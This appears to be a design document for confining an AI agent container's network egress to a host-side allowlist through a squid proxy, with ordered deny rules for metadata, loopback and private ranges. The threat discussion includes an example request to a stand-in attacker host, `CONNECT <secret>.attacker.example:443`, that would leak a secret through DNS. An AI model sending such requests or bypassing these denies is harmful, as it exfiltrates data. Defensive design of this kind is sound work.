## Context

Issue #75, as rescoped: a customer needs proof that traffic from an `--api`
session stays within the EU. Model traffic goes to an in-region gateway via
`--api`, and everything else must be denied by the network, not by
convention. Egress filtering for sessions without `--api` stays out of scope:
it would cost every user an allowlist to maintain. The constraints:

- No new capabilities in the agent container. `CapBnd` stays `0xc5` and the
  smoke assertion stays as it is, so the boundary cannot be an in-container
  firewall.
- The `--gh` auth-proxy sidecar already gives us a lifecycle to copy: a
  per-session network, trap-before-create teardown, a stopped-only prune,
  `run -d` without `--rm`, exited-sidecar detection, and a host-generated
  config mounted `:ro`.
- `run.sh` has no config-file parser, and the repo's stance is that the env
  var is the knob. `CLAUDE_DOCKER_GH_POLICY` and `CLAUDE_DOCKER_API_CA` are
  the precedent for an env var that points at a host-side file.

## Decisions

### `--api` implies the lock; nothing else turns it on

There is no separate flag. An `--api` session is the one that has a
requirement to prove where its traffic goes, and a separate flag would let
such a session run unlocked by mistake. Sessions without `--api` keep their
networking unchanged: no sidecar, no network change, no config.

### The network enforces; the proxy only applies the list

The agent container's only network is `claude-egress-<id>`, created with
`--internal`, so it has no gateway. The squid sidecar `claude-egress-proxy-<id>`
starts on a normal per-session network `claude-egress-out-<id>` and is then
connected to the internal one. We use a dedicated outbound network rather than
the engine's default network for two reasons: rootless podman's default
(pasta) cannot be multi-attached, and a dedicated network keeps other
containers on the default bridge away from the proxy port.

The agent gets `http_proxy`, `https_proxy`, `HTTP_PROXY` and `HTTPS_PROXY`,
all set to `http://<squid-ip>:3128`, plus `no_proxy`/`NO_PROXY` set to
`localhost,127.0.0.1,::1`. The proxy is addressed by IP, not name, the same way
`--gh` addresses its sidecar. A client that ignores these variables has no
route out and fails.

**DNS.** The agent never needs external DNS, because squid resolves names on
its behalf. On an internal network, Docker's embedded resolver does not
forward external queries (moby ≥ 26), so DNS tunnelling is closed as well.
The smoke cell asserts this (`getent hosts example.org` fails) rather than
assuming it.

### Squid, installed into the agent image. No new image, no new pin.

Caddy, which the `--gh` sidecar uses, cannot do this. Its forward proxy is a
third-party plugin that is not in the official image, and generalising the
reverse proxy would mean MITMing every allowed host. Squid's `CONNECT` keeps
TLS end-to-end. There is no first-party squid image on Docker Hub, so we had
two candidates: Canonical's `ubuntu/squid`, digest-pinned, or `apt-get install
squid` into the image we already build and run `$IMAGE` as the sidecar with
`--entrypoint /usr/sbin/squid`. We chose the second:

- It is supply-chain minimal. The bytes come from the Ubuntu archive we
  already trust for the base image, and Trivy scans them with the rest of the
  image.
- It adds no pull. The image is already local.
- It handles the version question. The README keeps Caddy out of `pins/`
  because an upgrade can change the semantics of the security-critical config
  we generate. Squid from the archive only moves within an Ubuntu release
  (security/bugfix SRUs). A major version change only happens when the `FROM`
  line changes, which is already a reviewed, separate change. Pinning an exact
  apt version would break the build every time the archive drops the old
  point release (`.hadolint.yaml` DL3008 rationale). So there is nothing for
  `pins/` / `update_pins.py` to track.
- The cost is image size (~15 MB), plus a squid binary present, and inert, in
  the agent container.

The sidecar runs with `--user proxy --cap-drop ALL --security-opt
no-new-privileges`. It listens on 3128 (> 1024), so it needs no capabilities.
It holds no secret.

### One host-side policy file; nothing implied

The effective list is exactly the entries of the file named by
`CLAUDE_DOCKER_EGRESS_POLICY` (conventionally
`~/.config/claude-docker/egress-policy.yaml`). There is no base set, and the
list doesn't grow from `ANTHROPIC_BASE_URL` or from the hosts of other
opt-ins (`--gh`, `--glab`, `--tfe`, `--aws`, `--az`, `--registry`). Anything
implied would be a host the auditor can't see in the file, and a built-in
Anthropic set would break the in-region guarantee outright. The cost is that
every user of `--api` needs a file. A team under the requirement ships one
file, and everyone on it gets the same policy.

**Fail fast on the model endpoint.** The host of `ANTHROPIC_BASE_URL`
(`api.anthropic.com` when unset) must match an exact or `.suffix` entry, or
`run.sh` aborts before any container resource exists and names the host and
the file. This doesn't open anything; it replaces a confusing first-request
failure. It follows that `--api` without a policy never starts. An IP-literal
endpoint skips the check (squid still enforces the policy): CIDR containment
in shell isn't worth it until someone needs it.

**Format.** YAML, because that's what users expect to hand an auditor, but
only a strict subset that a `case`/regex line reader handles, so there's no
parser dependency on the host or in the image:

```yaml
allow:
  - llm-gateway.example.eu     # exact host
  - .pypi.org                  # domain and subdomains (squid dstdomain)
  - 10.20.0.0/16               # IPv4 / CIDR: the only way to reach a private range
```

Accepted lines: blank, `#` comment, exactly one top-level `allow:` (trailing
comment allowed), and ` +- +<entry>` items after it (trailing ` # comment`
allowed; CR stripped). Any other line aborts with `file:line`: other keys, tab
indentation, `---`, flow `[...]`, an item before `allow:`. The file is read
with `read -r`, and nothing in it is ever evaluated. A set path that isn't a
readable file aborts, like `CLAUDE_DOCKER_API_CA`.

**Validation.** Every entry goes through one shell validator before it reaches
`squid.conf`:

- Hostnames must match `^\.?([A-Za-z0-9-]+\.)*[A-Za-z0-9-]+$` and be at most
  253 characters.
- IPv4/CIDR entries must match `^[0-9]{1,3}(\.[0-9]{1,3}){3}(/[0-9]{1,2})?$`.

Anything else aborts startup and names the entry and its line. That rejects
quotes, anchors, aliases and tags without special-casing them. We abort
rather than skip, because a silently dropped entry looks like a working
boundary. The validator is config-injection defence: squid never receives
whitespace, quotes or newlines from the file.

**No repo-supplied list.** A file inside the workspace is untrusted input, so
reading one would let any cloned repo grant itself egress. The policy is read
on the host only.

### Denies above the allowlist

The generated `http_access` rules, in this order:

1. deny `dstdomain metadata.google.internal metadata.azure.internal`;
2. deny ports other than 80/443, and `CONNECT` to anything but 443;
3. **deny any hostname that is not on the allowlist, unless the request is an
   IP literal.** This is a name-only check (`dstdomain -n`, `dstdom_regex -n`)
   and it comes before every `dst` ACL. A `dst` ACL makes squid resolve the
   name, so without this rule `CONNECT <secret>.attacker.example:443` would
   leak `<secret>` to the attacker's DNS server even though the request is
   then denied;
4. deny metadata and link-local: `dst 169.254.0.0/16 fe80::/10`;
5. deny loopback / unspecified: `dst 127.0.0.0/8 0.0.0.0/8 ::1`;
6. allow `dst` entries from the user CIDRs, plus the `--gh` sidecar's /32;
7. deny private ranges: `dst 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
   100.64.0.0/10 fc00::/7`;
8. allow `dstdomain -n <allowlist>`;
9. deny all.

After rule 3, the only names squid resolves are allowlisted ones. The `dst`
ACLs are evaluated against the address squid resolved, which makes rules 5
and 7 the DNS-rebinding defence: an allowlisted name that resolves inward is
refused. Rule 6 comes after rules 4 and 5, so no user entry can re-open
metadata or loopback. The `-n` on `dstdomain` stops a PTR record from making
an IP-literal request match an allowed name.

**RFC1918 policy (explicit).** Private ranges are denied by default. The
alternative, allowing them by default, would re-open rebinding for every
allowed name. Corporate gateways and registries (e.g. an `--api` LiteLLM on
`10.x`) need an explicit CIDR entry. That is one line, it is visible in the
user's own config, and it stays host-side.

### Composition with `--gh`

When both `--gh` (sidecar active) and `--api` are passed:

- The gh sidecar keeps its own outbound network `claude-gh-<id>` and is
  additionally connected to `claude-egress-<id>`.
- The agent's `--add-host` entries for the three hostnames use the gh
  sidecar's address on the egress network, and the agent is not attached to
  `claude-gh-<id>`.
- Squid receives the same three `--add-host` entries. Its `hosts_file` is
  `/etc/hosts`, so `CONNECT github.com:443` goes to the gh sidecar, which
  terminates TLS with the session CA and injects the token as it does today.
  The sidecar's /32 is in the rule (4) allow set, so the private deny does not
  catch it.
- We deliberately do not use `NO_PROXY` for GitHub: `no_proxy=github.com`
  also matches `codeload.github.com` in curl and Go, and a direct connection
  from the agent has no route.

This settles the #12 question for now as "per-provider sidecars, one egress
proxy". The egress proxy only routes; credentials stay in their own sidecars.

### What "deny" looks like

- HTTPS: `CONNECT` is answered `403`, e.g. curl reports `CONNECT tunnel
  failed, response 403`. Plain HTTP gets squid's standard access-denied page,
  which names the URL.
- At startup, `run.sh` prints the sidecar name and the effective allowlist to
  stderr.
- At session end, the EXIT trap reads squid's access log (stdout) and prints
  `claude-docker: egress policy blocked: <host> <host> … — add them to
  CLAUDE_DOCKER_EGRESS_POLICY (<path>) to permit them`. This is how the user finds out
  what to add without reading logs. During the session, `docker logs
  <sidecar>` shows the same entries.

### Lifecycle

This mirrors `--gh`. Resource names derive from the stage-dir suffix, and the
EXIT trap, installed before anything is created, removes the proxy container
and then both networks (after the gh sidecar, which may be attached to the
internal one). The stopped-only prune also covers `claude-egress-proxy-*`
containers and `claude-egress-*` networks.

Startup is fail-closed:

- network creation fails → abort;
- `run -d` fails → abort;
- the proxy exits during startup → abort, printing squid's last log lines;
- no `Accepting HTTP Socket connections` within 15s → abort;
- no proxy IP → abort.

On any of these the agent container is never started.

## Risks / Trade-offs

- **Friction.** Every `--api` user needs a policy file, and any host not in it
  fails. Mitigated by the startup check on the model endpoint, the
  end-of-session summary, and the docs listing the common hosts to add (npm,
  PyPI, HashiCorp, Go proxy, the hosts of each credential opt-in).
- **Breaking for `--api`.** An existing `--api` setup stops starting until it
  has a policy. `--api` (#104) is unreleased, so this lands before anyone
  depends on the open behaviour.
- **Gateway configured only in `settings.docker.json`.** `run.sh` can't see
  that `ANTHROPIC_BASE_URL`, so the startup check assumes `api.anthropic.com`,
  and that route without `--api` gets no lock at all. Documented.
- **Node's built-in `fetch` ignores proxy variables.** Scripts that use it
  fail closed. Claude Code, npm, pip, uv, git, curl and Go all honour them.
- **`.amazonaws.com` breadth under `--aws`.** Discussed above.
- **Docker < 26** forwarded external DNS from internal networks. The smoke
  assertion catches that on CI's engine. Users on older engines keep a DNS
  side channel, which is documented.
- **Podman** is untested. `--internal` and `network connect` exist there, but
  CI does not run podman.

## Open follow-ups

- Confirm empirically which hosts a real Claude Code session contacts under
  the pinned version, and document the minimal policy for a working session.
- A podman CI cell.
